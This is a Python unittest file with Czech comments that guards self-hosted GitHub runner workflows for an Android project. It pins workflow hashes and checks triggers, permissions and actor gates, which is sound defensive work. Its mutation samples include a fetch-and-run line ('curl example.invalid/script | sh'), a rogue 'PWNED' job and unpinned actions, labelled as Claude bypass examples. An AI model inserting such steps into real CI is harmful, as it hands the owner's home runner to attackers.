"""Regrese omezení domácího GitHub runneru.

Toto je CI pojistka proti NEÚMYSLNÉMU rozšíření oprávnění. Bez vynucené
GitHub branch protection NENÍ ochranou proti úmyslné změně main či workflow.
Nespouští CI, nedotýká se GitHub tokenů ani domácího počítače.
"""
from pathlib import Path
import re
import unittest
import hashlib

ROOT = Path(__file__).resolve().parents[1]
QA = ROOT / ".github/workflows/windows-self-hosted-qa.yml"
RELEASE = ROOT / ".github/workflows/windows-home-apk-release.yml"
QA_JOB_GATE = "${{ github.repository == 'zaplikj30-ui/Zamerovac-android' && github.actor == 'zaplikj30-ui' && github.ref == 'refs/heads/main' && (github.event_name == 'push' || github.event_name == 'workflow_dispatch') }}"
RELEASE_JOB_GATE = "${{ github.repository == 'zaplikj30-ui/Zamerovac-android' && github.actor == 'zaplikj30-ui' && github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main' && inputs.publish_release == true && inputs.qa_run_id != '' }}"


# Přesné otisky známých, samostatně zkontrolovaných workflow. Každá změna
# včetně run: příkazů vyžaduje nezávislou revizi a vědomou aktualizaci otisku.
# Není to ochrana před úmyslným commitem, který změní současně test i workflow.
WORKFLOW_NAMES = frozenset((
    "build-apk.yml",
    "emulator-smoke.yml",
    "export-audit-sources.yml",
    "quick-check.yml",
    "verify-native.yml",
    "windows-home-apk-release.yml",
    "windows-self-hosted-qa.yml",
))
WORKFLOW_SHA256 = {
    "windows-self-hosted-qa.yml": "5619a1a787236a22eaed4f90671bc88b10791ab0af7e27996747d4a7443d26c4",
    "windows-home-apk-release.yml": "672c76ae8f0ac3a8ce38cf98adf8661ec5631cca5b483e5c356a7dfad1f76911",
}


def workflow_inventory_violations(names):
    """Kdyby přibyl i x.yaml s libovolným eventem, musí test selhat."""
    return [] if set(names) == WORKFLOW_NAMES else [
        "Nečekaný nebo chybějící workflow soubor: "
        + repr(sorted(set(names) ^ WORKFLOW_NAMES))
    ]


def workflow_snapshot_violations(name, raw_bytes):
    """Tělo důvěryhodného workflow včetně všech jobů/steps/run musí souhlasit."""
    expected = WORKFLOW_SHA256.get(name)
    if expected is None:
        return ["Neznámý důvěryhodný workflow soubor"]
    actual = hashlib.sha256(raw_bytes).hexdigest()
    return [] if actual == expected else [
        f"Obsah {name} se změnil; vyžaduje nezávislou revizi a nový otisk"
    ]


def section(text, name):
    """Načti top-level sekci YAML bez další závislosti (nikoliv obecný YAML parser)."""
    pattern = rf"(?ms)^{re.escape(name)}:[^\n]*\n(.*?)(?=^[A-Za-z][\w-]*:|\Z)"
    match = re.search(pattern, text)
    return match.group(1) if match else ""


def event_names(text):
    return set(re.findall(r"(?m)^  ([a-z][a-z0-9_]*):\s*$", section(text, "on")))


def jobs(text):
    content = section(text, "jobs")
    matches = list(re.finditer(r"(?m)^  ([a-z][a-z0-9-]*):\s*$", content))
    return {
        match.group(1): content[match.end():matches[i+1].start() if i+1 < len(matches) else len(content)]
        for i, match in enumerate(matches)
    }


def unsafe_actions(text):
    # Každý GitHub Action v těchto důvěryhodných home workflows musí mít pevný SHA.
    calls = re.findall(r"(?m)^\s+uses:\s+(\S+)", text)
    return [call for call in calls if not re.fullmatch(r"[^@\s]+@[0-9a-f]{40}", call)]


def unchecked_checkout(text):
    # Jeden checkout je samostatný krok; kontrola nemůže omylem převzít
    # persist-credentials: false z úplně jiného kroku.
    steps = re.split(r"(?m)^      - ", text)
    return [step[:120] for step in steps if "uses: actions/checkout@" in step
            and "persist-credentials: false" not in step]


def qa_violations(text):
    errors = []
    ev = event_names(text)
    if ev != {"push", "workflow_dispatch"}:
        errors.append("QA smí spouštět pouze push a workflow_dispatch")
    on = section(text, "on")
    if not re.search(r"(?m)^  push:\s*\n    branches: \[main\]$", on):
        errors.append("QA push musí být omezen na main")
    perms = section(text, "permissions")
    if perms.strip() != "contents: read" or re.search(r"(?m)^    permissions:", text):
        errors.append("QA token nesmí získat zápis nebo per-job oprávnění")
    j = jobs(text)
    if set(j) != {"local-quick", "browser-smoke", "native-jvm", "preview-build-smoke"}:
        errors.append("Změněný počet/názvy QA jobů vyžaduje revizi")
    for name, body in j.items():
        gate = re.search(r"(?m)^    if:\s*(.+)$", body)
        if not gate or gate.group(1).strip() != QA_JOB_GATE:
            errors.append(f"QA job {name} nemá úplnou podmínku owner/main/event")
        if not re.search(r"(?m)^    runs-on:.*self-hosted.*zamerovac-qa", body):
            errors.append(f"QA job {name} nemá důvěryhodný runner label")
    if "QA_TEST_REF: $" + "{{ github.sha }}" not in text or "persist-credentials: false" not in text:
        errors.append("QA musí testovat přesné SHA a checkout bez credential cache")
    if text.count("uses: actions/checkout@") != len(j):
        errors.append("QA: každý job musí načíst důvěryhodné SHA pomocí checkout")
    if unsafe_actions(text) or unchecked_checkout(text):
        errors.append("QA akce nejsou všechny připnuté SHA / checkout ukládá token")
    return errors


def release_violations(text):
    errors = []
    if event_names(text) != {"workflow_dispatch"}:
        errors.append("Vydání APK musí zůstat výhradně ruční")
    perms = section(text, "permissions")
    if {line.strip() for line in perms.splitlines() if line.strip()} != {"contents: write", "actions: read"}:
        errors.append("Vydání: nečekaná oprávnění tokenu")
    if re.search(r"(?m)^    permissions:", text):
        errors.append("Vydání: nečekaná per-job oprávnění")
    j = jobs(text)
    if set(j) != {"home-preview-release"}:
        errors.append("Změna release jobů vyžaduje revizi")
    for name, body in j.items():
        gate = re.search(r"(?m)^    if:\s*(.+)$", body)
        if not gate or gate.group(1).strip() != RELEASE_JOB_GATE:
            errors.append(f"Vydání job {name}: chybí schválení nebo důvěryhodný main")
        if not re.search(r"(?m)^    runs-on:.*self-hosted.*zamerovac-qa", body):
            errors.append("Vydání nesměřuje na schválený domácí runner")
    on = section(text, "on")
    if not re.search(r"(?m)^      publish_release:\s*$", on) or "default: false" not in on:
        errors.append("Vydání není ve výchozím stavu zakázané")
    if text.count("uses: actions/checkout@") != 1:
        errors.append("Vydání musí mít jeden důvěryhodný checkout")
    if unsafe_actions(text) or unchecked_checkout(text):
        errors.append("Vydání obsahuje nepřipnutou akci / checkout ukládající token")
    return errors


class HomeRunnerTrustContract(unittest.TestCase):
    def test_actual_workflow_inventory_and_pinned_sources(self):
        workflow_dir = ROOT / ".github/workflows"
        names = {p.name for p in workflow_dir.iterdir()
                 if p.is_file() and p.suffix in {".yml", ".yaml"}}
        self.assertEqual([], workflow_inventory_violations(names))
        for name in WORKFLOW_SHA256:
            with self.subTest(workflow=name):
                self.assertEqual(
                    [],
                    workflow_snapshot_violations(
                        name, (workflow_dir / name).read_bytes(),
                    ),
                )

    def test_snapshot_guard_rejects_claude_bypass_examples(self):
        for name in WORKFLOW_SHA256:
            original = (ROOT / ".github/workflows" / name).read_bytes()
            samples = (
                original + b"\\n  Evil_job:\\n    runs-on: [self-hosted, zamerovac-qa]\\n    steps:\\n      - run: echo PWNED\\n",
                original + b"\\n      - uses: anything@main\\n",
                original + b"\\n      - run: curl example.invalid/script | sh\\n",
                original + b"\\npull_request_target: {}\\n",
            )
            for mutated in samples:
                with self.subTest(workflow=name, mutation=mutated[-90:]):
                    self.assertNotEqual(original, mutated)
                    self.assertTrue(workflow_snapshot_violations(name, mutated))
        self.assertTrue(workflow_inventory_violations(WORKFLOW_NAMES | {"x.yaml"}))
        self.assertTrue(workflow_inventory_violations(WORKFLOW_NAMES | {"unsafe.yml"}))

    def test_actual_home_qa_is_restricted(self):
        self.assertEqual([], qa_violations(QA.read_text(encoding="utf-8")))

    def test_actual_home_release_is_manual(self):
        self.assertEqual([], release_violations(RELEASE.read_text(encoding="utf-8")))

    def test_qa_guard_detects_dangerous_changes(self):
        source = QA.read_text(encoding="utf-8")
        mutations = (
            source.replace("  push:\n    branches: [main]", "  pull_request:\n    branches: [main]", 1),
            source.replace("  contents: read", "  contents: write", 1),
            source.replace("github.actor == 'zaplikj30-ui'", "github.actor == 'anyone'", 1),
            source.replace("&& github.actor == 'zaplikj30-ui'", "|| github.actor == 'zaplikj30-ui'", 1),
            source.replace("actions/checkout@11d5960a326750d5838078e36cf38b85af677262", "actions/checkout@v4", 1),
        )
        for bad in mutations:
            self.assertNotEqual(source, bad, "Mutace musí skutečně změnit vstup")
            self.assertTrue(qa_violations(bad), "Nebezpečná změna nevyvolala FAIL")

    def test_release_guard_detects_dangerous_changes(self):
        source = RELEASE.read_text(encoding="utf-8")
        mutations = (
            source.replace("  workflow_dispatch:\n", "  push:\n    branches: [main]\n", 1),
            source.replace("inputs.publish_release == true", "inputs.publish_release == false", 1),
            source.replace("github.actor == 'zaplikj30-ui'", "github.actor == 'anyone'", 1),
            source.replace("&& inputs.publish_release == true", "|| inputs.publish_release == true", 1),
            source.replace("persist-credentials: false", "persist-credentials: true", 1),
        )
        for bad in mutations:
            self.assertNotEqual(source, bad, "Mutace musí skutečně změnit vstup")
            self.assertTrue(release_violations(bad), "Nebezpečná změna nevyvolala FAIL")


if __name__ == "__main__":
    unittest.main()
